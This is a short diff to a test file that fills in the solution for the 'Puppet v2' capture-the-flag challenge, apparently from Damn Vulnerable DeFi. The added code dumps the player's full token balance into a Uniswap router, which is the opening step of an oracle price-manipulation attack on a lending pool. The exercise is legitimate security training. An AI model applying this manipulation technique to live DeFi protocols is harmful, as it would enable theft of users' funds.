@@ -103,6 +103,19 @@ describe("[Challenge] Puppet v2", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    let amountIn;
+    amountIn = PLAYER_INITIAL_TOKEN_BALANCE;
+    await token.connect(player).approve(uniswapRouter.address, amountIn);
+    let time = await helpers.time.latest();
+    await uniswapRouter
+      .connect(player)
+      .swapExactTokensForETH(
+        amountIn,
+        1,
+        [token.address, weth.address],
+        player.address,
+        time + 5000
+      );
   });
 
   after(async function () {
